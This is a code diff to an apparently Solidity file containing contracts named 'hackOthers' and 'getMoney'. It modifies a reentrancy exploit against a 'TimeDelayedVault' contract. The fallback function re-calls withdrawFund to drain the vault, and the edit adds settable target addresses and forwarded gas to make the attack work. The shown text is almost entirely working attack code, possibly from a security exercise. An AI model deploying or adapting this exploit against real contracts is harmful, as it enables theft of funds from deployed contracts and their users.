@@ -154,12 +154,18 @@ contract hackOthers {
 }
 
 contract getMoney{
-    //address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
-    address ct_addr = 0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3;
-    uint count = 0;
-    uint limit = 1;
+    address public ct_addr = 0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3;
+    uint public count = 0;
+    uint public limit = 1;
+    uint public gaslimit = 30000000;
     
     TimeDelayedVault ct = TimeDelayedVault(ct_addr);
+    function setGas(uint _gas){
+        gaslimit = _gas;
+    }
+    function setTarget(address _addr){
+        ct_addr = _addr;
+    }
     function addObserver(){
        ct.setObserver(this);    
     }
@@ -176,7 +182,7 @@ contract getMoney{
     function () payable {
         if(count<limit ){
             count += 1;
-            ct.withdrawFund(this);
+            ct.withdrawFund.gas(gaslimit)(this);
         }else{
             count = 0;
         }
